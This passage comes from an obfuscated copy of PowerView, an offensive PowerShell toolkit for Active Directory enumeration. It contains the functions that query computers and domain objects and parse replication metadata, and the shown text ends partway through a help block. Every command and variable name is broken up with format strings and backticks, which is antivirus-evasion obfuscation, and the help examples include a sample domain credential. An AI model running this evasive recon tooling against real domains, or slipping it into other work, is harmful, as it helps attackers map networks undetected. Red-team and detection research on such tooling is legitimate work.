            if (${pSb`ou`N`D`paraMETeRS}['OperatingSystem']) {
                &("{4}{3}{2}{0}{1}"-f 'er','bose','e-V','t','Wri') "[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem"
                ${fI`lt`Er} += "(operatingsystem=$OperatingSystem)"
            }
            if (${pSBO`UnDP`A`R`A`MeTeRS}['ServicePack']) {
                &("{2}{1}{3}{0}" -f'bose','e','Write-V','r') "[Get-DomainComputer] Searching for computers with service pack: $ServicePack"
                ${fi`LteR} += "(operatingsystemservicepack=$ServicePack)"
            }
            if (${P`s`B`o`UnDpARaM`eTErs}['SiteName']) {
                &("{1}{0}{2}" -f 'ite-','Wr','Verbose') "[Get-DomainComputer] Searching for computers with site name: $SiteName"
                ${fI`LTeR} += "(serverreferencebl=$SiteName)"
            }
            if (${P`SbOU`ND`PARaM`ETe`RS}['LDAPFilter']) {
                &("{2}{0}{4}{3}{1}"-f'e','e','Writ','rbos','-Ve') "[Get-DomainComputer] Using additional LDAP filter: $LDAPFilter"
                ${FIL`Ter} += "$LDAPFilter"
            }
            # build the LDAP filter for the dynamic UAC filter value
            ${uacF`Il`T`eR} | &("{1}{0}{2}"-f're-','Whe','Object') {${_}} | &("{4}{1}{3}{0}{2}" -f'e','ch-O','ct','bj','ForEa') {
                if (${_} -match 'NOT_.*') {
                    ${uaC`FIe`Ld} = ${_}.Substring(4)
                    ${uAcvAL`Ue} = [Int](${UAC`eN`Um}::${uACF`I`ElD})
                    ${FIlT`ER} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${UaC`V`AluE} = [Int](${uA`c`ENUm}::${_})
                    ${fI`L`TER} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${cOmps`EA`Rcher}.filter = "(&(samAccountType=805306369)$Filter)"
            &("{0}{2}{1}" -f'Write-','erbose','V') "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter)"

            if (${psbOUNDPAr`A`m`ET`ERs}['FindOne']) { ${r`e`sUlTS} = ${Co`M`PsE`ARcher}.FindOne() }
            else { ${rEsU`l`Ts} = ${c`Om`psE`ARCher}.FindAll() }
            ${ReS`Ul`TS} | &("{2}{0}{3}{1}"-f're-O','t','Whe','bjec') {${_}} | &("{2}{3}{0}{1}" -f 'e','ct','ForE','ach-Obj') {
                ${U`p} = ${t`RUE}
                if (${P`S`B`oun`DPaRa`metERs}['Ping']) {
                    ${u`p} = &("{0}{1}{4}{3}{2}"-f'Te','st','on','necti','-Con') -Count 1 -Quiet -ComputerName ${_}.properties.dnshostname
                }
                if (${u`P}) {
                    if (${PsbouNDPa`RA`me`TE`Rs}['Raw']) {
                        # return raw result objects
                        ${coMpu`TER} = ${_}
                        ${cOM`pUT`Er}.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        ${cO`M`pu`TeR} = &("{1}{0}{4}{3}{5}{2}"-f 'ert','Conv','perty','LDA','-','PPro') -Properties ${_}.Properties
                        ${COm`puter}.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    ${cO`M`PUtER}
                }
            }
            if (${R`EsUltS}) {
                try { ${resUL`TS}.dispose() }
                catch {
                    &("{2}{0}{1}" -f'rbos','e','Write-Ve') "[Get-DomainComputer] Error disposing of the Results object: $_"
                }
            }
            ${ComPsE`A`RCHER}.dispose()
        }
    }
}


function G`et-`DoMaiNO`BJECT {
<#
.SYNOPSIS

Return all (or specified) domain objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-ADName  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from $UACEnum, including
"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainObject -Domain testlab.local

Return all objects for the testlab.local domain

.EXAMPLE

'S-1-5-21-890171859-3433809279-3366196753-1003', 'CN=dfm,CN=Users,DC=testlab,DC=local','b6a9a2fb-bbd5-4f28-9a09-23213cea6693','dfm.a' | Get-DomainObject -Properties distinguishedname

distinguishedname
-----------------
CN=PRIMARY,OU=Domain Controllers,DC=testlab,DC=local
CN=dfm,CN=Users,DC=testlab,DC=local
OU=OU3,DC=testlab,DC=local
CN=dfm (admin),CN=Users,DC=testlab,DC=local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainObject -Credential $Cred -Identity 'windows1'

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

'testlab\harmj0y','DEV\Domain Admins' | Get-DomainObject -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainUser] Extracted domain 'testlab.local' from 'testlab\harmj0y'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=harmj0y)))

distinguishedname
-----------------
CN=harmj0y,CN=Users,DC=testlab,DC=local
VERBOSE: [Get-DomainUser] Extracted domain 'dev.testlab.local' from 'DEV\Domain Admins'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=Domain Admins)))
CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local

.OUTPUTS

PowerView.ADObject

Custom PSObject with translated AD object property fields.

PowerView.ADObject.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${Tr`Ue}, ValueFromPipelineByPropertyName = ${T`RUE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${ID`EnTI`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`mA`In},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${l`dAp`Fil`TeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pRo`pEr`TiEs},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SE`A`R`ChBASE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Se`Rv`er},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${Sear`chsc`opE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${REsU`lT`pageSi`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sErVe`RtiME`L`ImiT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${seCURit`y`M`ASKs},

        [Switch]
        ${tOM`Bs`TONe},

        [Alias('ReturnOne')]
        [Switch]
        ${Fin`dONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRed`E`NtI`AL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${r`Aw}
    )

    DynamicParam {
        ${Ua`Cva`LU`en`AMes} = [Enum]::GetNames(${Ua`c`EnUM})
        # add in the negations
        ${UA`cvaLueNAm`ES} = ${UAcv`ALUEN`A`m`eS} | &("{2}{3}{1}{0}" -f 'ct','h-Obje','ForEa','c') {${_}; "NOT_$_"}
        # create new dynamic parameter
        &("{3}{0}{2}{4}{1}"-f 'w-','ter','DynamicParam','Ne','e') -Name ("{1}{2}{0}" -f 'r','UACFil','te') -ValidateSet ${uA`cVALu`ENamEs} -Type ([array])
    }

    BEGIN {
        ${SEA`R`cher`Argu`M`EnTS} = @{}
        if (${PsboUnDPAr`Am`ET`ERs}['Domain']) { ${Sea`R`C`hE`RarGuMEnts}['Domain'] = ${d`oM`AIN} }
        if (${psbOU`Ndp`ArA`meTE`RS}['Properties']) { ${SEa`Rc`H`ERaR`g`UMenTs}['Properties'] = ${P`R`oP`eRtIES} }
        if (${psb`o`UN`DpaRa`m`EtERS}['SearchBase']) { ${Sea`RcH`ERar`gu`MeN`Ts}['SearchBase'] = ${SE`AR`CH`BASE} }
        if (${psbouNDpaRaM`E`TE`Rs}['Server']) { ${seARCH`Era`RgU`me`N`Ts}['Server'] = ${s`e`RveR} }
        if (${psBoundp`ARam`Ete`Rs}['SearchScope']) { ${sE`ArC`h`ERarGUMeNTS}['SearchScope'] = ${S`earc`hSCopE} }
        if (${pSbou`Ndp`Ar`AmEters}['ResultPageSize']) { ${S`EA`RCheRA`R`gUMeNts}['ResultPageSize'] = ${resULtP`AGEs`I`zE} }
        if (${P`SBouNDpARam`ETe`Rs}['ServerTimeLimit']) { ${sE`A`Rc`He`RARgumEnTS}['ServerTimeLimit'] = ${SEr`V`Er`TiMeLImiT} }
        if (${ps`B`OUNDp`ARAMeTeRs}['SecurityMasks']) { ${sEA`R`C`heRaRG`UMeNts}['SecurityMasks'] = ${sEc`Ur`iTYM`AS`Ks} }
        if (${PSBOU`Nd`PaRA`MetERS}['Tombstone']) { ${SEA`RCH`eRA`RGumEntS}['Tombstone'] = ${To`m`BsToNE} }
        if (${ps`B`OunDp`ArAMetErS}['Credential']) { ${sEarC`h`eRa`RGuMeNTS}['Credential'] = ${crEDEn`Ti`AL} }
        ${OBJectSe`A`R`chER} = &("{4}{2}{0}{1}{3}"-f 'nS','earc','omai','her','Get-D') @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if (${P`SBoU`NdPAr`AM`eTeRs} -and (${P`sbOU`NDP`ArA`M`EtErs}.Count -ne 0)) {
            &("{3}{0}{5}{2}{1}{4}{6}" -f 'e','ynam','-D','N','icPa','w','rameter') -CreateVariables -BoundParameters ${Psbo`Un`D`ParAMeT`Ers}
        }
        if (${O`BJe`CTSEaRch`ER}) {
            ${id`EnT`iT`Y`FIlTer} = ''
            ${F`iLteR} = ''
            ${ide`NTItY} | &("{2}{1}{0}" -f 'Object','-','Where') {${_}} | &("{0}{1}{3}{2}"-f'For','Each','ject','-Ob') {
                ${iD`eNtiTYI`N`stAn`ce} = ${_}.Replace('(', '\28').Replace(')', '\29')
                if (${IDen`T`I`T`YInsTAncE} -match '^S-1-') {
                    ${iDeNTItyF`I`lt`er} += "(objectsid=$IdentityInstance)"
                }
                elseif (${i`dENtIt`yI`Ns`TancE} -match '^(CN|OU|DC)=') {
                    ${IdENt`ITyf`Il`T`Er} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${pSbO`UN`dpar`AMEt`eRS}['Domain']) -and (-not ${ps`Bou`Nd`pArAMet`ERS}['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        ${ID`E`NT`ItYdOMaIN} = ${iD`ent`ITyI`NstA`NCe}.SubString(${I`d`entI`TY`iNSTANcE}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{4}{0}{1}{3}{2}" -f 'rite-','V','rbose','e','W') "[Get-DomainObject] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        ${seaRC`HeRa`R`g`UMe`NtS}['Domain'] = ${i`DE`NTitY`DOMaiN}
                        ${ObJ`e`CTSEAr`cHeR} = &("{5}{2}{3}{4}{1}{0}" -f'her','c','t','-Do','mainSear','Ge') @SearcherArguments
                        if (-not ${OB`Je`CtSEaRChER}) {
                            &("{2}{0}{1}{4}{3}" -f'rite-Warn','i','W','g','n') "[Get-DomainObject] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif (${IdenTIt`y`InsTa`NCE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${g`UI`dBY`TEstrIng} = (([Guid]${I`DenTIty`I`NSTaNcE}).ToByteArray() | &("{1}{0}{3}{2}" -f'orE','F','Object','ach-') { '\' + ${_}.ToString('X2') }) -join ''
                    ${IDEN`TIT`Y`FILTer} += "(objectguid=$GuidByteString)"
                }
                elseif (${Id`en`Ti`TYINS`TaNCE}.Contains('\')) {
                    ${C`o`NVERTEDIDEn`TityInsT`AN`ce} = ${idENTITy`i`NstAN`Ce}.Replace('\28', '(').Replace('\29', ')') | &("{0}{2}{1}"-f'Convert-ADNa','e','m') -OutputType ("{2}{1}{0}" -f'nical','o','Can')
                    if (${CO`NVert`EdiDen`TItY`iNstA`Nce}) {
                        ${o`BjEc`TDoMain} = ${c`O`N`V`ERte`DidentITyinsta`Nce}.SubString(0, ${C`onVeR`T`ediD`en`T`ItYI`NS`TAnCE}.IndexOf('/'))
                        ${o`BjEcTN`AmE} = ${IDENt`i`T`YinStA`NCe}.Split('\')[1]
                        ${i`de`NTiTY`FILteR} += "(samAccountName=$ObjectName)"
                        ${SearcheRAr`g`UM`ENTs}['Domain'] = ${O`BJ`Ect`d`OmAiN}
                        &("{0}{3}{1}{4}{2}"-f 'Writ','-Verb','se','e','o') "[Get-DomainObject] Extracted domain '$ObjectDomain' from '$IdentityInstance'"
                        ${OB`JecTs`eaR`c`heR} = &("{1}{4}{3}{2}{0}" -f'r','G','ainSearche','Dom','et-') @SearcherArguments
                    }
                }
                elseif (${iDeNt`i`TYInstaN`ce}.Contains('.')) {
                    ${IdE`Nti`TYFI`lT`eR} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${i`d`ENtiTyfiLTEr} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${i`DEN`TITYFi`LtEr} -and (${i`DENti`T`YFi`LtEr}.Trim() -ne '') ) {
                ${F`iLtEr} += "(|$IdentityFilter)"
            }

            if (${PSbOUndpArA`m`Et`ers}['LDAPFilter']) {
                &("{2}{1}{0}"-f '-Verbose','te','Wri') "[Get-DomainObject] Using additional LDAP filter: $LDAPFilter"
                ${f`i`LteR} += "$LDAPFilter"
            }

            # build the LDAP filter for the dynamic UAC filter value
            ${uaC`FiL`TER} | &("{0}{2}{1}" -f 'Where','ect','-Obj') {${_}} | &("{2}{1}{4}{0}{3}"-f'ach-Objec','or','F','t','E') {
                if (${_} -match 'NOT_.*') {
                    ${Uac`F`i`Eld} = ${_}.Substring(4)
                    ${UAC`VA`l`UE} = [Int](${u`A`ceNUm}::${uA`cFie`lD})
                    ${fIL`T`eR} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${u`AcvA`lue} = [Int](${u`Ace`NuM}::${_})
                    ${f`iLTeR} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if (${FI`lter} -and ${f`ilT`Er} -ne '') {
                ${obJECtse`A`Rch`eR}.filter = "(&$Filter)"
            }
            &("{2}{3}{1}{0}" -f 'se','bo','Writ','e-Ver') "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter)"

            if (${P`Sbo`UN`DpaRAM`ET`ErS}['FindOne']) { ${res`U`Lts} = ${O`B`JEctSeArCH`ER}.FindOne() }
            else { ${R`ES`ULts} = ${OB`je`CTsEA`RC`hEr}.FindAll() }
            ${REsul`Ts} | &("{0}{2}{1}" -f'Wh','e-Object','er') {${_}} | &("{2}{0}{1}"-f 'Objec','t','ForEach-') {
                if (${pSbOund`pArA`mE`Ters}['Raw']) {
                    # return raw result objects
                    ${oB`j`ECt} = ${_}
                    ${O`Bj`ECt}.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    ${Ob`J`ecT} = &("{4}{5}{1}{3}{0}{2}" -f'ope','-LDA','rty','PPr','C','onvert') -Properties ${_}.Properties
                    ${oB`jECT}.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                ${O`BJeCt}
            }
            if (${Res`U`lTS}) {
                try { ${R`eSu`LtS}.dispose() }
                catch {
                    &("{2}{0}{3}{1}" -f'Ver','se','Write-','bo') "[Get-DomainObject] Error disposing of the Results object: $_"
                }
            }
            ${O`B`JeCtSE`ArCHER}.dispose()
        }
    }
}


function GEt-`D`O`maInObJEcT`A`TTrIbUteH`I`stOrY {
<#
.SYNOPSIS

Returns the Active Directory attribute replication metadata for the specified
object, i.e. a parsed version of the msds-replattributemetadata attribute.
By default, replication data for every domain object is returned.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject

.DESCRIPTION

Wraps Get-DomainObject with a specification to retrieve the property 'msds-replattributemetadata'.
This is the domain attribute replication metadata associated with the object. The results are
parsed from their XML string form and returned as a custom object.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Only return replication metadata on the specified property names.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectAttributeHistory -Domain testlab.local

Return all attribute replication metadata for all objects in the testlab.local domain.

.EXAMPLE

'S-1-5-21-883232822-274137685-4173207997-1109','CN=dfm.a,CN=Users,DC=testlab,DC=local','da','94299db1-e3e7-48f9-845b-3bffef8bedbb' | Get-DomainObjectAttributeHistory -Properties objectClass | ft

ObjectDN      ObjectGuid    AttributeNam LastOriginat Version      LastOriginat
                            e            ingChange                 ingDsaDN
--------      ----------    ------------ ------------ -------      ------------
CN=dfm.a,C... a6263874-f... objectClass  2017-03-0... 1            CN=NTDS S...
CN=DA,CN=U... 77b56df4-f... objectClass  2017-04-1... 1            CN=NTDS S...
CN=harmj0y... 94299db1-e... objectClass  2017-03-0... 1            CN=NTDS S...

.EXAMPLE

Get-DomainObjectAttributeHistory harmj0y -Properties userAccountControl

ObjectDN              : CN=harmj0y,CN=Users,DC=testlab,DC=local
ObjectGuid            : 94299db1-e3e7-48f9-845b-3bffef8bedbb
AttributeName         : userAccountControl
LastOriginatingChange : 2017-03-07T19:56:27Z
Version               : 4
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.OUTPUTS

PowerView.ADObjectAttributeHistory

Custom PSObject with translated replication metadata fields.

.LINK

https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-1-when-did-the-delegation-change-how-to-track-security-descriptor-modifications/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${TR`UE}, ValueFromPipelineByPropertyName = ${T`Rue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${i`deNTi`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`maIn},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${l`dA`pFilt`eR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pROPe`Rt`Ies},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${s`EaRC`hB`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${S`ERVER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SEAR`CHs`cOpE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`suL`TPAgesiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sEr`VerTi`MELI`m`iT},

        [Switch]
        ${to`mBst`ONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`eDEN`TIAL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${SEARCH`eRar`gU`ments} = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   ${t`RUe}
        }
        if (${p`sbOundPAR`AMe`Te`RS}['Domain']) { ${sEAr`ChE`Ra`RGUMenTS}['Domain'] = ${d`oMa`IN} }
        if (${PS`BOUn`D`P`AramETeRS}['LDAPFilter']) { ${S`E`A`RchE`RARGumE`NTs}['LDAPFilter'] = ${lDap`F`I`LteR} }
        if (${pSboundPArA`m`eTE`RS}['SearchBase']) { ${sE`ARC`HErAR`G`UMENTs}['SearchBase'] = ${SEArc`H`Ba`Se} }
        if (${P`s`BoUndpaRAMet`ERs}['Server']) { ${seaR`CHErar`GU`mEnTS}['Server'] = ${Se`RVer} }
        if (${PS`B`OuNd`PAR`AmeTE`RS}['SearchScope']) { ${S`e`Ar`c`hERargUmE`NtS}['SearchScope'] = ${sE`ArcHsc`ope} }
        if (${PSb`Oun`DPa`RA`Meters}['ResultPageSize']) { ${se`Ar`cHEr`ArguM`eNtS}['ResultPageSize'] = ${rE`S`ULtPaG`e`SiZe} }
        if (${Ps`B`O`UNdPArameTerS}['ServerTimeLimit']) { ${sEa`RCHErA`RG`UmE`NtS}['ServerTimeLimit'] = ${sE`R`VErt`i`mELIMiT} }
        if (${pSBOuN`Dp`ArAme`T`eRs}['Tombstone']) { ${s`eaRChE`R`ARG`Ume`NTS}['Tombstone'] = ${t`O`MbStoNE} }
        if (${PSBOUndPA`R`AmE`TeRS}['FindOne']) { ${sE`ARChEra`RGUme`NTs}['FindOne'] = ${FIn`d`One} }
        if (${P`sB`o`UNdP`A`RAmetErs}['Credential']) { ${sEa`R`chE`RARgUmeNTS}['Credential'] = ${C`REDeN`TIal} }

        if (${PSb`OUNDPar`AM`E`TerS}['Properties']) {
            ${pROp`er`TYFi`lTer} = ${PsBOU`NdparaME`T`E`RS}['Properties'] -Join '|'
        }
        else {
            ${pROP`e`R`TyfIl`TER} = ''
        }
    }

    PROCESS {
        if (${PsboUN`dP`Ar`Ame`TeRS}['Identity']) { ${sEaR`C`HerArgUm`e`NtS}['Identity'] = ${ID`eNtity} }

        &("{3}{0}{1}{2}"-f '-Domain','Obj','ect','Get') @SearcherArguments | &("{3}{2}{0}{1}"-f'e','ct','-Obj','ForEach') {
            ${obJE`C`T`Dn} = ${_}.Properties['distinguishedname'][0]
            ForEach(${XML`No`De} in ${_}.Properties['msds-replattributemetadata']) {
                ${TeMpo`Bje`Ct} = [xml]${xmL`NO`De} | &("{1}{2}{0}" -f 'ect','S','elect-Obj') -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction ("{2}{4}{3}{0}{1}"-f 'i','nue','Sil','Cont','ently')
                if (${t`E`M`PobjEct}) {
                    if (${TE`MP`o`BjEcT}.pszAttributeName -Match ${PRoPErtY`FIL`T`er}) {
                        ${O`UT`pUT} = &("{0}{2}{3}{1}" -f'New-Ob','ct','j','e') ("{2}{1}{0}"-f 't','jec','PSOb')
                        ${oU`T`PuT} | &("{1}{0}{2}" -f 'dd-Mem','A','ber') ("{1}{3}{0}{2}" -f'per','N','ty','otePro') 'ObjectDN' ${oBj`e`ctDN}
                        ${o`Ut`PUT} | &("{0}{2}{1}" -f'Add-Me','r','mbe') ("{3}{2}{1}{0}"-f 'erty','p','Pro','Note') 'AttributeName' ${TEmp`OBj`eCt}.pszAttributeName
                        ${oUtp`Ut} | &("{1}{0}{2}" -f '-','Add','Member') ("{0}{2}{1}{3}"-f 'Not','Pr','e','operty') 'LastOriginatingChange' ${teM`POBjE`CT}.ftimeLastOriginatingChange
                        ${o`UtpUt} | &("{0}{1}{2}"-f 'A','dd-M','ember') ("{0}{3}{1}{2}"-f'Not','opert','y','ePr') 'Version' ${TEmpO`B`j`ECt}.dwVersion
                        ${Ou`TPUT} | &("{0}{2}{1}{3}" -f'Add-','em','M','ber') ("{0}{2}{1}"-f 'No','erty','teProp') 'LastOriginatingDsaDN' ${T`emPo`BJe`CT}.pszLastOriginatingDsaDN
                        ${o`Utp`UT}.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        ${o`UT`put}
                    }
                }
                else {
                    &("{2}{0}{1}{3}" -f 'rite-V','erb','W','ose') "[Get-DomainObjectAttributeHistory] Error retrieving 'msds-replattributemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function GET-DoMainOBJ`ec`T`l`iNKEDattRIB`Ut`eHisToRY {
<#
.SYNOPSIS

Returns the Active Directory links attribute value replication metadata for the
specified object, i.e. a parsed version of the msds-replvaluemetadata attribute.
By default, replication data for every domain object is returned.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject

.DESCRIPTION

Wraps Get-DomainObject with a specification to retrieve the property 'msds-replvaluemetadata'.
This is the domain linked attribute value replication metadata associated with the object. The
results are parsed from their XML string form and returned as a custom object.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Only return replication metadata on the specified property names.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectLinkedAttributeHistory | Group-Object ObjectDN | ft -a

Count Name
----- ----
    4 CN=Administrators,CN=Builtin,DC=testlab,DC=local
    4 CN=Users,CN=Builtin,DC=testlab,DC=local
    2 CN=Guests,CN=Builtin,DC=testlab,DC=local
    1 CN=IIS_IUSRS,CN=Builtin,DC=testlab,DC=local
    1 CN=Schema Admins,CN=Users,DC=testlab,DC=local
    1 CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
    4 CN=Domain Admins,CN=Users,DC=testlab,DC=local
    1 CN=Group Policy Creator Owners,CN=Users,DC=testlab,DC=local
    1 CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=testlab,DC=local
    1 CN=Windows Authorization Access Group,CN=Builtin,DC=testlab,DC=local
    8 CN=Denied RODC Password Replication Group,CN=Users,DC=testlab,DC=local
    2 CN=PRIMARY,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,...
    1 CN=Domain System Volume,CN=DFSR-LocalSettings,CN=PRIMARY,OU=Domain Con...
    1 CN=ServerAdmins,CN=Users,DC=testlab,DC=local
